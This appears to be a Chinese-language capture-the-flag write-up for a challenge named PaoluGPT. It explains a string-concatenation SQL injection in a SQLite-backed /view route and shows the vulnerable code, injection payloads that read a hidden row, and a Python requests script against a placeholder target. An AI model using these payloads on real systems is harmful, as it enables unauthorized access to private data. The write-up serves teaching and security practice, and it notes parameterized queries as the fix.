# PaoluGPT

## 题目简述

服务把 1000 条对话写入 SQLite 表 `messages(id, title, contents, shown)`。其中一条显示对话的 `contents` 末尾附有第一个 flag，另一条附有第二个 flag 但 `shown = false`。`GET /list` 只列出 `shown = true` 的记录，`GET /view?conversation_id=...` 则显示指定对话。

决定性漏洞是 `/view` 直接把查询参数拼入 SQL：

```python
conversation_id = request.args.get("conversation_id")
results = execute_query(
    f"select title, contents from messages where id = '{conversation_id}'"
)
```

数据库以只读模式打开，但这并不阻止 `SELECT` 注入读出隐藏行。鉴权 token 只是访问题目容器的正常会话门槛，不是本题的利用点。

## 解题过程

`database.py` 默认只返回 `fetchone()`，所以注入条件应尽量精确选中目标行。原始查询是：

```sql
select title, contents from messages where id = '<conversation_id>'
```

以单引号闭合字符串，再用 SQLite 的 `--` 注释掉末尾引号。第二个 flag 所在行是唯一的隐藏行，因此参数可写成：

```text
' or shown = false --
```

完整查询变为：

```sql
select title, contents from messages where id = '' or shown = false --'
```

将参数 URL 编码后请求 `/view`：

```python
import requests

base = "http://TARGET"
s = requests.Session()  # 先按题目正常流程建立已授权 session
payload = "' or shown = false --"
r = s.get(f"{base}/view", params={"conversation_id": payload})
print(r.text)
```

页面返回的对话内容末尾即是第二个 flag。

第一个 flag 在可见记录中，可以爬取 `/list` 里的全部 `/view` 链接并搜索 `flag`，也可用更直接的注入条件：

```text
' or shown = true and contents like '%flag%' --
```

对应查询只选取“可见且内容包含 `flag`”的行。生成数据库时在 flag 前附加了大量换行，因此页面可能看似只有普通对话；应搜索响应源文本或滚动到末尾，不要把前端空白误认为注入失败。

如果使用 `sqlmap`，必须传入当前 session cookie，并从其导出的 CSV 而非被截断的控制台输出中搜索 flag。本题的两个定向条件已足够，无需完整拖库。

## 方法总结

- 核心技巧：利用 SQLite 字符串拼接型 SQL 注入，用布尔条件精确选中显示或隐藏的 flag 记录。
- 识别信号：请求参数出现在 f-string SQL 中，同时列表路由通过 `shown` 字段隐藏了部分数据。
- 复用要点：只读数据库仍可泄露数据；当应用只渲染第一行时，应用 `WHERE` / `LIKE` / `LIMIT OFFSET` 缩小结果，并优先使用参数化查询从根本上修复。
